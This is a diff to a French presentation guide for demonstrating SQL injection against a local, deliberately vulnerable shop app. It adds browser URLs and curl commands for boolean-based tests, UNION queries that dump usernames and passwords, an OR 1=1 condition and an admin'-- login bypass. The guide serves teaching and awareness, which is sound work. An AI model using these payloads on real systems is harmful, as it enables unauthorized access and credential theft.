@@ -65,17 +65,82 @@ Routes disponibles :
 - `/search?q=clavier` — injection dans un LIKE
 - `/login` — formulaire POST vulnérable à un bypass d'authentification
 
-## 2. Montrer l'injection "à la main" d'abord (pédagogique)
+## 2. Montrer l'injection "à la main" — NAVIGATEUR + CLI
 
+Le navigateur est plus parlant pour le public (on voit la page web réagir), le CLI
+montre la mécanique (code HTTP, requête SQL affichée). Fais les deux en alternance.
+
+### 2.1 Condition vraie / fausse (boolean-based)
+
+**Navigateur** — colle dans la barre d'adresse :
+```
+http://127.0.0.1:5500/product?id=1 AND 1=1--
+http://127.0.0.1:5500/product?id=1 AND 1=2--
+```
+→ La 1ère affiche le produit normalement, la 2e affiche un tableau vide. C'est LA preuve visuelle du boolean-blind.
+
+**CLI équivalent :**
 ```bash
-# Récupérer TOUS les produits au lieu d'un seul (condition toujours vraie)
-curl "http://127.0.0.1:5500/product?id=1%20OR%201=1"
+curl -s "http://127.0.0.1:5500/product?id=1%20AND%201=1--" | grep -o "Clavier mecanique"
+curl -s "http://127.0.0.1:5500/product?id=1%20AND%201=2--" | grep -o "Clavier mecanique"
+```
 
-# Bypass d'authentification classique
+### 2.2 Dump visuel via UNION (le plus impressionnant)
+
+**Navigateur** — colle dans la barre d'adresse :
+```
+http://127.0.0.1:5500/product?id=-1 UNION SELECT id,username,password,is_admin FROM users--
+```
+→ Les comptes utilisateurs (y compris le mot de passe admin) s'affichent **directement
+dans le tableau "produits" du site**, comme si c'étaient des articles de la boutique.
+C'est l'image qui marque le plus un public non-technique.
+
+**CLI équivalent :**
+```bash
+curl -s "http://127.0.0.1:5500/product?id=-1%20UNION%20SELECT%20id,username,password,is_admin%20FROM%20users--" \
+  | grep -oP "<td>[^<]*</td>"
+```
+
+### 2.3 Récupérer tous les produits avec une condition toujours vraie
+
+**Navigateur :**
+```
+http://127.0.0.1:5500/product?id=1 OR 1=1--
+```
+
+**CLI :**
+```bash
+curl "http://127.0.0.1:5500/product?id=1%20OR%201=1--"
+```
+
+### 2.4 Bypass d'authentification
+
+**Navigateur** — va sur `http://127.0.0.1:5500/login` et tape directement dans le formulaire :
+- Username : `admin'--`
+- Password : `nimportequoi` (n'importe quoi, ignoré)
+→ Connexion acceptée en admin, visible à l'écran avec la requête SQL affichée juste au-dessus.
+
+**CLI équivalent :**
+```bash
 curl -X POST http://127.0.0.1:5500/login \
   --data-urlencode "username=admin'--" \
   --data-urlencode "password=nimportequoi"
 ```
+
+### 2.5 Injection dans la recherche (LIKE)
+
+**Navigateur :**
+```
+http://127.0.0.1:5500/search?q=%' UNION SELECT id,username,password,is_admin FROM users--
+```
+
+**CLI :**
+```bash
+curl -s "http://127.0.0.1:5500/search?q=%25%27%20UNION%20SELECT%20id,username,password,is_admin%20FROM%20users--"
+```
+
+> Astuce présentation : ouvre deux onglets côte à côte, un avec l'URL "vraie" et un avec
+> la "fausse" (2.1), pour montrer visuellement la différence en un coup d'œil sans retaper.
 
 ## 3. Lancer sqlmap — détection
 
